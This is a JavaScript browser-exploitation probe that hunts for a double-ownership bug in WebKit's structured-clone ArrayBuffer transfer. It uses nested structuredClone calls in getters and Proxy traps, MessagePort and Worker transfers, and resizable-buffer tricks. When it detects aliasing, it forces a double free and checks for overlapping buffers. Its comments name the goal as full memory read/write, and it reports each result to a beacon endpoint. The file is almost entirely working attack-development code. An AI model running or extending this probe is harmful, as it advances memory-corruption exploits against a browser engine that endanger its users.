/* p119 — SSV transfer-ownership double-claim oracles
 *
 * TARGET: ArrayBufferContents ownership handoff in
 *         SerializedScriptValue::create(exec, message, transferList, ...).
 *
 * THE UNTESTED CELL: the ordering between transfer-list REGISTRATION and
 * the actual contents MOVE (ArrayBuffer::detach). Two possible impls:
 *
 *   SAFE-1 (register+move upfront): outer SSV detaches buf at registration.
 *     -> nested structuredClone in a getter sees a detached buffer -> throws.
 *     -> outer completes. Signature: nestedErr=DataCloneError, outer OK,
 *        outer.v.byteLength===0.
 *
 *   SAFE-2 (serialize first, move at finalize, re-check at move):
 *     -> nested transfer in a getter MOVES the contents.
 *     -> outer finalize re-checks: buf detached -> throws DataCloneError.
 *     Signature: nested OK, outerErr=DataCloneError.
 *
 *   BUG (serialize first, move at finalize, NO re-check / stale contents
 *        captured at registration): BOTH SSVs claim the same
 *        ArrayBufferContents -> double ownership -> double free on teardown
 *        -> overlapping ArrayBuffers in the Gigacage -> full R/W.
 *     Signature: nested OK, outer OK, outer.v.byteLength===SIZE, ALIAS.
 *
 * Any deviation from the two safe signatures is immediately actionable.
 *
 * Also: stale/double-registered MessagePort identifier matrix (N7 follow-up),
 * RAB+transfer ordering, transfer-list edge cases.
 *
 * Beacon prefix: V119O-
 */
(function(){
var RUN_ID = "v119o" + Math.random().toString(36).slice(2,12);
var PREFIX = "V119O-";

function B(tag, body) {
  try {
    var d = typeof body === "object" ? JSON.stringify(body) : String(body);
    fetch("/beacon/" + PREFIX + tag, {
      method: "POST", body: JSON.stringify({r: RUN_ID, b: d.slice(0,1800)}),
      headers: {"Content-Type":"application/json"}
    }).catch(function(){});
    try { navigator.sendBeacon("/beacon/" + PREFIX + tag,
      JSON.stringify({r: RUN_ID, b: d.slice(0,1800)})); } catch(e2){}
  } catch(e){}
}
B("L", "press119-ssv-ownership");

var hb = setInterval(function(){ B("HB", "hb"); }, 5000);

var SIZE = 0x4000;   // 16KB contents: distinctive cage size class

function fillU32(ab, v) {
  var u = new Uint32Array(ab);
  for (var i = 0; i < u.length; i++) u[i] = v;
  return u;
}

/* GC pressure: force eden/full collections so dropped clone ABs actually
 * reach the free list (needed only in the double-free churn follow-up). */
function pressure(mb) {
  mb = mb || 96;
  var keep = [];
  for (var i = 0; i < mb * 4; i++) {
    keep.push({ a: i, b: [i, i + 1, i + 2], c: "pressure_" + i });
    if ((i & 0xFF) === 0) keep = [keep[keep.length - 1]];
  }
  keep = null;
  for (var j = 0; j < 64; j++) { var t = new Array(4096).fill(j); t[0] = j; }
}

/* Overlap census for the double-free follow-up: allocate N distinct-filled
 * buffers, then verify no two views observe clobbered markers. */
function overlapCensus(n, sz) {
  n = n || 64; sz = sz || SIZE;
  var probes = [];
  for (var i = 0; i < n; i++) {
    var ab = new ArrayBuffer(sz);
    new Uint32Array(ab).fill(0xB0000000 + i);
    probes.push(ab);
  }
  var clobbered = [];
  for (var i2 = 0; i2 < n; i2++) {
    var v = new Uint32Array(probes[i2])[0];
    if (v !== (0xB0000000 + i2) && clobbered.length < 8) {
      clobbered.push(i2 + ":" + v.toString(16));
    }
  }
  return { n: n, clobbered: clobbered.join("|"), overlap: clobbered.length > 0 };
}

/* ═══════════════════════════════════════════════════════════════
 * A1: nested transfer inside a getter of an OUTER structuredClone
 *     that itself transfers the same buffer.
 * ═══════════════════════════════════════════════════════════════ */
function test_A1() {
  var r = { t: "A1" };
  try {
    var buf = new ArrayBuffer(SIZE);
    fillU32(buf, 0x11111111);
    var nested = null, nestedErr = null;
    var outer = null, outerErr = null;

    var src = {
      get g() {
        try {
          nested = structuredClone({ n: new Uint8Array(buf) }, { transfer: [buf] });
        } catch (e) { nestedErr = e.name + ":" + String(e.message).slice(0, 60); }
        return 1;
      },
      v: new Uint8Array(buf)
    };
    try {
      outer = structuredClone(src, { transfer: [buf] });
      r.outerOk = true;
    } catch (e) { outerErr = e.name + ":" + String(e.message).slice(0, 60); }

    r.nestedErr = nestedErr || "ok";
    r.outerErr = outerErr || "ok";
    r.origLen = buf.byteLength; // 0 unless something failed to detach

    if (nested && outer) {
      try {
        var na = nested.n.buffer;
        var oa = outer.v.buffer;
        r.nestedLen = na.byteLength;
        r.outerLen = oa.byteLength;
        var a = new Uint32Array(na);
        var b = new Uint32Array(oa);
        a[0] = 0x600D600D;
        r.alias = (b[0] === 0x600D600D);
      } catch (e2) { r.aliasErr = e2.name; }
    }

    r.origViewAfter = (function(){ try { return new Uint8Array(buf).length; } catch(e){ return -1; } })();

    if (r.alias) {
      /* BUG SIGNATURE — double ownership. Beacon FIRST (survives a crash
       * in the follow-up), then force the double free and census. */
      B("CRIT-ALIAS", r);
      nested = null; outer = null; buf = null; src = null;
      pressure(128);
      var cen = overlapCensus(64, SIZE);
      B("CRIT-CHURN", cen);
      if (cen.overlap) B("CRIT-OVERLAP", { jack: "overlapping ArrayBuffers in cage" });
    }
    r.SURVIVED = true;
    B("A1-NESTED-TRANSFER", r);
  } catch (e) {
    r.err = e.name + ":" + String(e.message).slice(0, 80);
    B("A1-ERR", r);
  }
}

/* ═══════════════════════════════════════════════════════════════
 * A2: same ordering question via a Proxy [[Get]] trap (different
 *     serializer code path: own-key enumeration + get).
 * ═══════════════════════════════════════════════════════════════ */
function test_A2() {
  var r = { t: "A2" };
  try {
    var buf = new ArrayBuffer(SIZE);
    fillU32(buf, 0x22222222);
    var nested = null, nestedErr = null;
    var outer = null, outerErr = null;

    var src = new Proxy({ v: new Uint8Array(buf) }, {
      ownKeys: function (t) { return ["g", "v"]; },
      getOwnPropertyDescriptor: function (t, k) {
        if (k === "g") return { configurable: true, enumerable: true, get: function () {
          try { nested = structuredClone({ n: new Uint8Array(buf) }, { transfer: [buf] }); }
          catch (e) { nestedErr = e.name; }
          return 1;
        }};
        if (k === "v") return { configurable: true, enumerable: true, writable: true, value: t.v };
        return undefined;
      },
      get: function (t, k) {
        if (k === "g") { /* reached via Get after descriptor */ }
        return t[k];
      }
    });
    try { outer = structuredClone(src, { transfer: [buf] }); r.outerOk = true; }
    catch (e) { outerErr = e.name; }

    r.nestedErr = nestedErr || "ok";
    r.outerErr = outerErr || "ok";
    if (nested && outer) {
      try {
        new Uint32Array(nested.n.buffer)[0] = 0x600D600D;
        r.alias = (new Uint32Array(outer.v.buffer)[0] === 0x600D600D);
        r.nestedLen = nested.n.buffer.byteLength;
        r.outerLen = outer.v.buffer.byteLength;
      } catch (e2) { r.aliasErr = e2.name; }
    }
    if (r.alias) B("CRIT-ALIAS-PROXY", r);
    r.SURVIVED = true;
    B("A2-PROXY-TRAP", r);
  } catch (e) { r.err = e.name + ":" + String(e.message).slice(0, 80); B("A2-ERR", r); }
}

/* ═══════════════════════════════════════════════════════════════
 * A3: ordering through MessagePort.postMessage transfer path
 *     (may differ from structuredClone path).
 * ═══════════════════════════════════════════════════════════════ */
function test_A3() {
  var r = { t: "A3" };
  try {
    var buf = new ArrayBuffer(SIZE);
    fillU32(buf, 0x33333333);
    var nested = null, nestedErr = null;
    var mc = new MessageChannel();
    var delivered = null;

    var msg = {
      get g() {
        try { nested = structuredClone({ n: new Uint8Array(buf) }, { transfer: [buf] }); }
        catch (e) { nestedErr = e.name; }
        return 1;
      },
      v: new Uint8Array(buf)
    };
    mc.port2.onmessage = function (e) { delivered = e.data; };
    mc.port2.start ? mc.port2.start() : 0;

    var sendErr = null;
    try { mc.port1.postMessage(msg, [buf]); r.sendOk = true; }
    catch (e) { sendErr = e.name; }

    r.nestedErr = nestedErr || "ok";
    r.sendErr = sendErr || "ok";
    setTimeout(function () {
      try {
        if (delivered) {
          r.deliveredVLen = delivered.v && delivered.v.buffer.byteLength;
          if (nested) {
            new Uint32Array(nested.n.buffer)[0] = 0x600D600D;
            r.alias = !!(delivered.v &&
              new Uint32Array(delivered.v.buffer)[0] === 0x600D600D);
          }
        } else { r.delivered = false; }
        r.SURVIVED = true;
        if (r.alias) B("CRIT-ALIAS-PORT", r);
        B("A3-PORT-POSTMESSAGE", r);
      } catch (e2) { B("A3-ERR", { err: e2.name }); }
    }, 400);
  } catch (e) { r.err = e.name + ":" + String(e.message).slice(0, 80); B("A3-ERR", r); }
}

/* ═══════════════════════════════════════════════════════════════
 * A4: ordering through Worker.postMessage transfer path.
 * ═══════════════════════════════════════════════════════════════ */
var WORKER = null, WORKER_READY = false;

function makeWorker() {
  try {
    var src = "self.onmessage=function(e){ self.postMessage({ack:true}); };";
    var url = URL.createObjectURL(new Blob([src], { type: "text/javascript" }));
    var w = new Worker(url);
    URL.revokeObjectURL(url);
    w.onmessage = function (e) {
      if (e.data && e.data.ack) WORKER_READY = true;
    };
    w.onerror = function (ev) { B("WORKER-ERR", { m: String(ev.message).slice(0, 120) }); };
    w.postMessage({ ping: 1 });
    return w;
  } catch (e) {
    B("WORKER-FAIL", { err: e.name + ":" + String(e.message).slice(0, 120) });
    return null;
  }
}

function test_A4() {
  var r = { t: "A4" };
  try {
    if (!WORKER) { r.skipped = "no-worker"; B("A4-PORT-POSTMESSAGE", r); return; }
    var buf = new ArrayBuffer(SIZE);
    fillU32(buf, 0x44444444);
    var nested = null, nestedErr = null;

    var msg = {
      get g() {
        try { nested = structuredClone({ n: new Uint8Array(buf) }, { transfer: [buf] }); }
        catch (e) { nestedErr = e.name; }
        return 1;
      },
      v: new Uint8Array(buf)
    };
    var sendErr = null;
    try { WORKER.postMessage(msg, [buf]); r.sendOk = true; }
    catch (e) { sendErr = e.name; }

    r.nestedErr = nestedErr || "ok";
    r.sendErr = sendErr || "ok";
    r.SURVIVED = true;
    B("A4-WORKER-POSTMESSAGE", r);
  } catch (e) { r.err = e.name + ":" + String(e.message).slice(0, 80); B("A4-ERR", r); }
}

/* ═══════════════════════════════════════════════════════════════
 * B1: stale port DOUBLE-REGISTRATION (N7 follow-up).
 *     Transfer port P away, then structuredClone({p:P},{transfer:[P]})
 *     again -> is the MessagePortIdentifier re-registered into a second
 *     SSV? Double entanglement -> double delivery / double free of
 *     port machinery.
 * ═══════════════════════════════════════════════════════════════ */
function test_B1() {
  var r = { t: "B1" };
  try {
    var mc = new MessageChannel();
    var gotA = 0, gotB = 0;
    mc.port2.onmessage = function () { gotA++; };

    /* transfer port1 away to port2's... to a second channel's port */
    var mc2 = new MessageChannel();
    try { mc2.port1.postMessage("carrier", [mc.port1]); r.firstTransfer = "ok"; }
    catch (e) { r.firstTransfer = e.name; }

    /* mc.port1 is now stale. N7 says postMessage on it is "accepted".
     * Now RE-SERIALIZE the stale port as a value + transfer it AGAIN: */
    var clone = null, cloneErr = null;
    try {
      clone = structuredClone({ p: mc.port1 }, { transfer: [mc.port1] });
      r.recloneOk = true;
    } catch (e) { cloneErr = e.name + ":" + String(e.message).slice(0, 60); }
    r.recloneErr = cloneErr || "ok";

    /* any delivery anomalies after ~1s? */
    setTimeout(function () {
      try {
        r.gotA = gotA; r.gotB = gotB;
        r.stalePost = (function () {
          try { mc.port1.postMessage("stale-b1"); return "accepted"; }
          catch (e) { return e.name; }
        })();
        setTimeout(function () {
          try {
            r.gotA2 = gotA;
            r.SURVIVED = true;
            B("B1-DOUBLE-REG", r);
          } catch (e2) { B("B1-ERR", { late: e2.name }); }
        }, 300);
      } catch (e1) { B("B1-ERR", { mid: e1.name }); }
    }, 300);
  } catch (e) { r.err = e.name + ":" + String(e.message).slice(0, 80); B("B1-ERR", r); }
}

/* ═══════════════════════════════════════════════════════════════
 * B2: port SELF-TRANSFER — P.postMessage({me:P}, [P]).
 *     Port is serialized inside its own outgoing message while being
 *     transferred. Historically crashes / double-frees identifiers.
 * ═══════════════════════════════════════════════════════════════ */
function test_B2() {
  var r = { t: "B2" };
  try {
    var mc = new MessageChannel();
    var recv = null, recvPorts = 0;
    mc.port2.onmessage = function (e) {
      recv = e.data;
      recvPorts = (e.ports && e.ports.length) || 0;
    };
    var sendErr = null;
    try { mc.port1.postMessage({ me: mc.port1 }, [mc.port1]); r.sendOk = true; }
    catch (e) { sendErr = e.name + ":" + String(e.message).slice(0, 60); }
    r.sendErr = sendErr || "ok";

    setTimeout(function () {
      try {
        r.recv = !!recv;
        r.recvPorts = recvPorts;
        r.meIsPort = !!(recv && recv.me && typeof recv.me.postMessage === "function");
        /* if we received a port handle back, exercise it */
        if (recv && recv.me) {
          try { recv.me.postMessage("loop"); r.loopSend = "accepted"; }
          catch (e) { r.loopSend = e.name; }
        }
        r.SURVIVED = true;
        B("B2-SELF-TRANSFER", r);
      } catch (e2) { B("B2-ERR", { late: e2.name }); }
    }, 400);
  } catch (e) { r.err = e.name + ":" + String(e.message).slice(0, 80); B("B2-ERR", r); }
}

/* ═══════════════════════════════════════════════════════════════
 * B3: pending-queue handoff under load — transfer a receiving port
 *     that holds a deep queue of undelivered SSVs.
 * ═══════════════════════════════════════════════════════════════ */
function test_B3() {
  var r = { t: "B3" };
  try {
    var mc = new MessageChannel();
    var N = 500;
    /* port2 has no onmessage yet -> messages queue with transferred ABs */
    for (var i = 0; i < N; i++) {
      var b = new ArrayBuffer(64);
      new Uint32Array(b)[0] = 0xBEEF0000 + i;
      mc.port1.postMessage(b, [b]);
    }
    r.queued = N;
    /* transfer the queue-holding port2 into a carrier message */
    var mc2 = new MessageChannel();
    var carrierErr = null;
    try {
      mc2.port1.postMessage({ p: mc.port2 }, [mc.port2]);
      r.carrierSend = "ok";
    } catch (e) { carrierErr = e.name; }
    r.carrierErr = carrierErr || "ok";

    var drain = 0;
    mc2.port2.onmessage = function (e) {
      /* carrier received: start the transferred port2, drain its queue */
      var p = e.data.p;
      try {
        p.onmessage = function (m) { drain++; };
        p.start ? p.start() : 0;
      } catch (e2) { r.drainSetupErr = e2.name; }
    };
    setTimeout(function () {
      try {
        r.drained = drain;         /* expected ~N if queue handoff is sound */
        r.drainedLow = drain < N - 5;
        r.SURVIVED = true;
        B("B3-QUEUE-HANDOFF", r);
      } catch (e2) { B("B3-ERR", { late: e2.name }); }
    }, 900);
  } catch (e) { r.err = e.name + ":" + String(e.message).slice(0, 80); B("B3-ERR", r); }
}

/* ═══════════════════════════════════════════════════════════════
 * C1: cross-realm ownership ping-pong with ALIAS CENSUS.
 *     (p110 pattern-3 bounced but never kept handles alive nor
 *     checked for two JS ArrayBuffers materialized from one
 *     ArrayBufferContents — that's the actual N7 kill condition.)
 * ═══════════════════════════════════════════════════════════════ */
function test_C1() {
  var r = { t: "C1" };
  try {
    if (!WORKER) { r.skipped = "no-worker"; B("C1-PINGPONG", r); return; }
    var echo = "self.onmessage=function(e){ self.postMessage(e.data, [e.data]); };";
    var url = URL.createObjectURL(new Blob([echo], { type: "text/javascript" }));
    var w = new Worker(url);
    URL.revokeObjectURL(url);

    var handles = [];
    var BOUNCES = 24;
    var done = false;

    function scan() {
      /* every handle got marker 0xC0DEC0DE+i at dword 1. If any pair
       * aliases, later writes clobbered earlier markers. */
      var bad = [];
      for (var i = 0; i < handles.length; i++) {
        var v;
        try { v = new Uint32Array(handles[i])[1]; } catch (e) { v = "E:" + e.name; }
        if (v !== (0xC0DEC0DE + i) && bad.length < 8) bad.push(i + ":" + v);
      }
      return bad;
    }

    w.onmessage = function (e) {
      try {
        var h = e.data;
        handles.push(h);
        var i = handles.length - 1;
        new Uint32Array(h)[1] = 0xC0DEC0DE + i;   /* write AFTER recording */
        if (i < BOUNCES - 1) {
          w.postMessage(h, [h]);
        } else {
          /* final scan — read every marker back */
          var bad = scan();
          r.bounces = handles.length;
          r.badMarkers = bad.join("|");
          r.alias = bad.length > 0;
          r.allLensOk = handles.every(function (hh) { return hh.byteLength === SIZE; });
          r.SURVIVED = true;
          if (r.alias) {
            B("CRIT-ALIAS-PINGPONG", r);
            /* drop everything, pressure, census for overlap */
            handles = null;
            pressure(128);
            B("CRIT-CHURN-PINGPONG", overlapCensus(64, SIZE));
          }
          B("C1-PINGPONG", r);
          done = true;
          try { w.terminate(); } catch (e2) {}
        }
      } catch (e3) {
        B("C1-ERR", { mid: e3.name + ":" + String(e3.message).slice(0, 80) });
      }
    };

    var b0 = new ArrayBuffer(SIZE);
    fillU32(b0, 0x55555555);
    new Uint32Array(b0)[1] = 0xC0DEC0DE + 0;
    w.postMessage(b0, [b0]);

    setTimeout(function () {
      if (!done) { r.timeout = true; r.got = handles.length; B("C1-PINGPONG", r); }
    }, 6000);
  } catch (e) { r.err = e.name + ":" + String(e.message).slice(0, 80); B("C1-ERR", r); }
}

/* ═══════════════════════════════════════════════════════════════
 * D-series: RAB + transfer ordering.
 * ═══════════════════════════════════════════════════════════════ */
function test_D() {
  var r = { t: "D" };
  try {
    /* D1: getter shrinks RAB BEFORE the view is serialized */
    var rab = new ArrayBuffer(SIZE, { maxByteLength: SIZE * 2 });
    var rabView = new Uint8Array(rab);
    var c1 = null, c1Err = null;
    try {
      c1 = structuredClone({
        get g() { try { rab.resize(256); } catch (e) {} return 1; },
        v: rabView
      }, { transfer: [rab] });
    } catch (e) { c1Err = e.name; }
    r.d1Err = c1Err || "ok";
    if (c1) {
      r.d1CloneByteLen = c1.v.buffer.byteLength;
      r.d1ViewLen = c1.v.length;
      r.d1MaxLen = c1.v.buffer.resizable ? "n/a" : "fixed";
    }

    /* D2: view serialized FIRST, getter shrinks AFTER */
    var rab2 = new ArrayBuffer(SIZE, { maxByteLength: SIZE * 2 });
    var c2 = null, c2Err = null;
    try {
      c2 = structuredClone({
        v: new Uint8Array(rab2),
        get g() { try { rab2.resize(256); } catch (e) {} return 1; }
      }, { transfer: [rab2] });
    } catch (e) { c2Err = e.name; }
    r.d2Err = c2Err || "ok";
    if (c2) { r.d2CloneByteLen = c2.v.buffer.byteLength; r.d2ViewLen = c2.v.length; }

    /* D3: double-listing the same buffer in ONE transfer list */
    var buf3 = new ArrayBuffer(128);
    var c3 = null, c3Err = null;
    try { c3 = structuredClone({}, { transfer: [buf3, buf3] }); }
    catch (e) { c3Err = e.name + ":" + String(e.message).slice(0, 50); }
    r.d3Err = c3Err || "ok";
    r.d3Ok = !!c3;
    r.d3LenAfter = buf3.byteLength;

    /* F1: Proxy-wrapped real buffer in transfer list */
    var buf4 = new ArrayBuffer(128);
    var c4 = null, c4Err = null;
    try { c4 = structuredClone({}, { transfer: [new Proxy(buf4, {})] }); }
    catch (e) { c4Err = e.name; }
    r.f1Err = c4Err || "ok";
    r.f1Ok = !!c4;

    r.SURVIVED = true;
    B("D-RAB-TRANSFER", r);
  } catch (e) { r.err = e.name + ":" + String(e.message).slice(0, 80); B("D-ERR", r); }
}

/* ═══════════════════════════════════════════════════════════════
 * Schedule
 * ═══════════════════════════════════════════════════════════════ */
setTimeout(test_A1, 500);
setTimeout(test_A2, 2500);
setTimeout(test_A3, 4500);
setTimeout(function () { WORKER = makeWorker(); test_A4(); }, 6500);
setTimeout(test_B1, 8500);
setTimeout(test_B2, 10500);
setTimeout(test_B3, 12500);
setTimeout(test_C1, 15500);
setTimeout(test_D, 23000);
setTimeout(function () {
  B("Z", "probe119-done");
  clearInterval(hb);
}, 30000);
})();
